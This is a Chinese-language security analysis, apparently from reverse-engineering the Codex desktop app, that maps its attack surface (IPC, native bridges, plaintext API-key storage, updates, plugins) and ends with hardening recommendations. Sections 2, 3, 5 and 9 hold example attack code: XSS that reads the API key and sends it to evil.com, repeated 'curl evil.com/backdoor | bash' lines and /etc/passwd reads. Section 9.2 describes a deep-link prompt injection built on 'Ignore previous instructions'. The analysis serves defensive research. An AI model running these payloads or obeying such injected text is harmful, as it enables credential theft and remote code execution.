# Codex 安全攻击面分析

> 来源：对 Codex App 26.506.31421 的完整逆向分析
> 分类：安全研究文档

---

## 1. 攻击面总览

```
                          ┌──────────────────┐
                          │   远程攻击者      │
                          └────────┬─────────┘
                                   │
                    ┌──────────────┼──────────────┐
                    │              │              │
              ┌─────▼─────┐ ┌─────▼─────┐ ┌─────▼─────┐
              │ Sparkle   │ │ Deep Link │ │  API      │
              │ 自动更新   │ │ codex://  │ │ Endpoints │
              └─────┬─────┘ └─────┬─────┘ └─────┬─────┘
                    │              │              │
┌───────────────────┼──────────────┼──────────────┼───────────────────┐
│                   │   Codex App  │              │                   │
│  ┌────────────────▼──────────────▼──────────────▼────────────────┐  │
│  │                      IPC 通信层                               │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐   │  │
│  │  │ Preload API │  │ Settings    │  │ Message Types       │   │  │
│  │  │ (electron   │  │ (sendSync   │  │ (open-in-*,         │   │  │
│  │  │  Bridge)    │  │  + 凭据)     │  │  command-*, etc)    │   │  │
│  │  └─────────────┘  └─────────────┘  └─────────────────────┘   │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                    原生模块层                                  │  │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
│  │  │ objc-js  │ │ sqlite3  │ │ node-pty │ │ Secure Enclave │  │  │
│  │  │ (任意ObjC│ │ (loadExt │ │ (fork/)  │ │ (签名密钥)     │  │  │
│  │  │  调用)   │ │  ension) │ │  exec)   │ │                │  │  │
│  │  └──────────┘ └──────────┘ └──────────┘ └────────────────┘  │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                    文件系统层                                  │  │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
│  │  │ User     │ │ API Key  │ │ Session  │ │ Plugin/Skills  │  │  │
│  │  │ Data     │ │ Storage  │ │ Token    │ │ Directory      │  │  │
│  │  └──────────┘ └──────────┘ └──────────┘ └────────────────┘  │  │
│  └──────────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────┘
```

---

## 2. IPC 攻击面

### 2.1 风险矩阵

| 通道 | 访问方式 | 风险等级 | 风险描述 |
|------|----------|----------|----------|
| `codex_desktop:message-from-view` | invoke | **HIGH** | 任何渲染进程可发送任意消息 |
| `codex_desktop:get-shared-object-snapshot` | sendSync | **HIGH** | 同步读取所有共享状态 |
| `openai-api-key` (settings) | sendSync | **CRITICAL** | 以明文存储的 API Key 可被读取 |
| `x-codex-client-session-token` (settings) | sendSync | **CRITICAL** | Session Token 可被读取 |
| `codex_desktop:show-context-menu` | invoke | MEDIUM | 可触发 UI 欺骗 |
| `codex_desktop:trigger-sentry-test` | invoke | LOW | 垃圾日志/DoS |

### 2.2 XSS → IPC 提权

如果渲染进程存在 XSS：

```javascript
// 攻击者可以通过 XSS 执行：
const bridge = window.electronBridge;

// 1. 窃取凭据
const apiKey = bridge.getSharedObjectSnapshotValue("openai-api-key");
const sentryOpts = bridge.getSentryInitOptions();  // 包含 session ID

// 2. 发送恶意消息
await bridge.sendMessageFromView({
  type: "open-in-browser",
  url: "https://evil.com/exfil?key=" + apiKey,
});

// 3. 注入命令
await bridge.sendMessageFromView({
  type: "run-command",
  commandId: "malicious-command",
});

// 4. Worker 线程注入
await bridge.sendWorkerMessageFromView("computer-use", {
  type: "execute",
  command: "curl evil.com/backdoor | bash",
});
```

### 2.3 缺少的防护措施

- [ ] 渲染进程发送消息的 Content Validation
- [ ] IPC 通道的速率限制
- [ ] 凭据读取的审计日志
- [ ] 敏感 IPC 通道的调用者上下文验证
- [ ] Message Type 的严格白名单校验

---

## 3. 原生桥接攻击面

### 3.1 objc-js: 完全系统访问

```typescript
// ⚠️ 如果攻击者能执行 Node.js 代码（通过 XSS → Node REPL 或 Worker 线程）
// 即可通过 objc-js 获得完全系统访问

// 示例攻击链：
const objc = require("objc-js");

// 1. 启动任意应用
const ws = new objc.NobjcObject("NSWorkspace").$sharedWorkspace();
ws.$openURL(new objc.NobjcObject("NSURL", "file:///Applications/Terminal.app"));

// 2. 读取系统文件
const data = objc.callFunction("NSData", "dataWithContentsOfFile:", "/etc/passwd");

// 3. 注入按键（通过 Accessibility API）
const systemWide = new objc.NobjcObject("AXUIElement", /* system-wide element */);
systemWide.$postKeyboardEvent(/* key down/up events */);

// 4. 加载任意 dylib
const lib = new objc.NobjcLibrary("/tmp/evil.dylib");
// 之后调用 dylib 中导出的函数

// 5. 执行 shell 命令
objc.callFunction("system", "curl evil.com/backdoor | bash");
```

**当前防护**：无。objc-js 提供完全系统访问，依赖调用者已被信任。

### 3.2 better-sqlite3: 数据窃取和代码执行

```typescript
// 1. SQLite 扩展加载 = 代码执行
db.loadExtension("/tmp/evil_sqlite_extension.dylib");

// 2. 数据库序列化 = 完整数据窃取
const serialized = db.serialize();  // 整个 .db 变为 Buffer
// 通过 IPC 或网络外泄

// 3. unsafeMode() 禁用安全检查
db.unsafeMode(true);
db.exec("DROP TABLE important_data;");
```

**当前防护**：需要文件系统访问来放置恶意扩展。

### 3.3 node-pty: 任意命令执行

```typescript
const pty = require("node-pty");

// 只要能被调用，就可执行任意命令
const term = pty.spawn("bash", [], { cwd: "/" });
term.write("curl evil.com/backdoor | bash\n");
```

**当前防护**：PTY 访问可能需要明确的用户操作触发。

---

## 4. 凭据存储安全

### 4.1 API Key 存储

```typescript
// 存储位置：Electron Settings（明文）
// 读取方式：ipcRenderer.sendSync("openai-api-key")
// 持久化：自动保存到磁盘
// macOS 路径：~/Library/Application Support/Codex/

// ⚠️ 安全风险：
// 1. 明文存储
// 2. 任何 preload 脚本可同步读取
// 3. 磁盘文件可能被其他应用读取
// 4. 没有使用 macOS Keychain
```

### 4.2 Session Token 存储

```typescript
// x-codex-client-session-token
// 同样存储在 Electron Settings 中，明文
// 可被任何 preload 渲染进程读取
```

### 4.3 Device Key（较安全）

```typescript
// remote-control-device-key.node 使用 Secure Enclave
// ECDSA P-256 密钥存储在硬件中
// 私钥不可导出
// 但签名操作可通过 JS API 调用
```

### 4.4 改进建议

- [ ] 使用 macOS Keychain (`SecItemAdd`/`SecItemCopyMatching`) 存储 API Key
- [ ] Session Token 使用加密存储
- [ ] 限制可读取凭据的 preload 脚本范围
- [ ] 添加凭据访问审计日志
- [ ] 支持生物特征验证（Touch ID）访问敏感凭据

---

## 5. 网络通信安全

### 5.1 API 端点

```typescript
// 生产 API
const API_BASE = "https://chatgpt.com/backend-api";

// 可通过环境变量覆盖
// CODEX_API_BASE_URL → 任意 URL
// CODEX_API_ENDPOINT="localhost" → http://localhost:8000/api

// ⚠️ 安全风险：
// 1. 环境变量可被本地攻击者修改
// 2. localhost 回退可能被 DNS 重绑定攻击
```

### 5.2 CSP 绕过

虽然渲染进程有 CSP 限制：

```
connect-src 'self' https://ab.chatgpt.com https://cdn.openai.com
```

但主进程和 Worker 线程通过 Node.js 进行 HTTP 请求，**完全不受 CSP 限制**：

```typescript
// Worker 线程可以直接执行：
const https = require("https");
https.get("https://evil.com/exfil?data=" + stolenData);
```

### 5.3 Sparkle 更新安全

```typescript
// 更新 Feed: https://persistent.oaistatic.com/codex-app-prod/appcast.xml
// 公钥: rhcBvttuqDFriyNqwTQJR3L4UT1WjIK4QxtwtwusVic=

// Sparkle 使用 Ed25519 签名验证：
// 1. 下载 appcast.xml
// 2. 验证每个更新的 Ed25519 签名
// 3. 下载更新包
// 4. 验证更新包的签名

// ⚠️ 攻击面：
// 1. Feed URL 硬编码，但如果编译时被修改...
// 2. 公钥硬编码，但如果二进制被篡改...
// 3. DNS 劫持 + 自签名更新 = 代码执行
// 4. Sparkle 已知 CVE（如 CVE-2022-22723 等）
```

---

## 6. 进程间通信安全

### 6.1 对等授权

browser-use-peer-authorization.node 提供代码签名验证：

```typescript
// Unix Domain Socket 对等验证
// 1. getsockopt(LOCAL_PEERTOKEN) 获取对等审计令牌
// 2. SecCodeCopyGuestWithAttributes 验证签名
// 3. 检查 Bundle ID 和 Team ID

const ALLOWED_BUNDLE_IDS = [
  "com.openai.codex", "com.openai.codex.agent",
  "com.openai.codex.alpha", "com.openai.codex.beta",
  "com.openai.codex.dev", "com.openai.codex.nightly",
  "com.openai.codex.owl", "com.openai.codex.runtime",
];
const ALLOWED_TEAM_ID = "2DC432GLL2";
```

**攻击面**：
- 如果 Apple 颁发的证书被攻破或撤销
- 签名验证逻辑的 bug
- 时间窗口攻击（证书过期到续期之间）

### 6.2 Computer Use MCP

```
Electron Main → spawn → SkyComputerUseClient (MCP Server)
                                ↓
                    stdin/stdout JSON-RPC
```

**攻击面**：
- MCP JSON-RPC 消息注入
- 如果 SkyComputerUseClient 被替换为恶意二进制
- Accessibility API 调用可被 EDR/安全工具监控，但不会被阻止

---

## 7. 文件系统安全

### 7.1 用户数据路径

```typescript
// macOS: ~/Library/Application Support/Codex/
// 包含:
//   .codex-global-state.json  — 全局状态
//   config.toml               — 配置
//   codex-logs-*.txt          — 日志（含 API 调用细节）
//   browser-sidebar-local-servers.json — 本地服务器列表
//   plugins/                  — 插件目录
//   skills/                   — 自定义 Skills

// ⚠️ 风险：
// 1. 日志文件可能包含 API 响应数据
// 2. config.toml 可能包含敏感配置
// 3. 插件和 Skills 目录可被注入恶意内容
```

### 7.2 工作区根目录

```typescript
// Codex 可以访问用户指定的工作区目录
// 通过 'workspace-root-options-updated' 消息动态添加

// ⚠️ 如果攻击者能添加 ~/ 或 / 作为工作区根目录
// 则可读取系统任意文件
```

---

## 8. Session 隔离

### 8.1 Partition 命名

```typescript
// Session partition 格式
"persist:main"          // 主窗口
"persist:worker"         // Worker
"persist:webview"        // WebView
`persist:thread-${id}`   // 线程级别隔离

// ⚠️ 风险：
// 1. Partition 名可预测，可能来自渲染进程
// 2. 如果 threadId 可控，可能访问其他线程的 session
// 3. persist: 意味着数据持久化到磁盘，跨会话可访问
```

### 8.2 跨窗口数据泄漏

```typescript
// SharedObject 在所有渲染进程中共享
// 一个渲染进程设置的 key，其他进程立即可读

// 消息广播
// 'codex_desktop:message-for-view' 广播到所有监听窗口
// 'codex_desktop:system-theme-variant-updated' 也广播
```

---

## 9. 攻击链示例

### 9.1 XSS → API Key 窃取

```
1. 某个来源的恶意内容在渲染进程中渲染（如 Markdown 预览的 HTML 注入）
2. 执行 JavaScript:
   const key = electronBridge.getSharedObjectSnapshotValue("openai-api-key");
   fetch("https://evil.com/collect?key=" + key);
3. API Key 被窃取
```

**前提条件**：渲染进程的 XSS 漏洞
**影响**：OpenAI API Key 的完全控制

### 9.2 Deep Link → 命令注入

```
1. 用户点击恶意链接: codex://newThread?prompt=Ignore previous instructions...
2. 如果 prompt 参数直接传递给 Agent 而不经过过滤
3. Agent 可能执行恶意指令
```

**前提条件**：codex:// 协议注册，用户点击恶意链接
**影响**：Agent 执行恶意操作

### 9.3 Plugin → 代码执行

```
1. 用户安装恶意插件（.codex-plugin/plugin.json + malicious MCP server）
2. MCP Server 作为子进程启动
3. MCP Server 具有 Node.js 完全权限（objc-js 可用）
4. 可执行任意系统操作
```

**前提条件**：用户安装不受信任的插件
**影响**：完全系统入侵

### 9.4 Sparkle MITM → RCE

```
1. 攻击者在同一网络（或 DNS 劫持）
2. 伪造 Sparkle Feed 响应
3. 使用自签名密钥签名更新
4. 用户点击"Install Update"
5. 恶意代码以 Codex 权限执行
```

**前提条件**：网络位置 + Sparkle 签名验证绕过
**影响**：RCE with user privileges

---

## 10. 安全建议总结

### 高优先级

| # | 建议 | 影响的攻击面 |
|---|------|-------------|
| 1 | **使用 macOS Keychain 存储凭据** | 凭据窃取 |
| 2 | **IPC 消息白名单 + 内容验证** | XSS → IPC 提权 |
| 3 | **限制 preload API 暴露范围** | 渲染进程权限过大 |
| 4 | **添加 IPC 通道的调用者上下文验证** | 跨窗口攻击 |
| 5 | **工作区根目录路径限制** | 文件系统遍历 |

### 中优先级

| # | 建议 | 影响的攻击面 |
|---|------|-------------|
| 6 | **objc-js 调用添加权限检查** | 原生桥接滥用 |
| 7 | **Deep Link 参数验证和沙箱** | Deep Link 注入 |
| 8 | **Sparkle Feed HTTPS + 证书固定** | 更新 MITM |
| 9 | **Session partition 名随机化** | Session 隔离 |
| 10 | **日志文件敏感信息脱敏** | 信息泄漏 |

### 低优先级

| # | 建议 | 影响的攻击面 |
|---|------|-------------|
| 11 | IPC 速率限制 | DoS |
| 12 | 凭据访问审计日志 | 事后取证 |
| 13 | MCP JSON-RPC 消息签名 | MCP 注入 |
| 14 | WASM CSP 更严格限制 | WASM 沙箱 |
| 15 | 插件签名验证 | 恶意插件 |
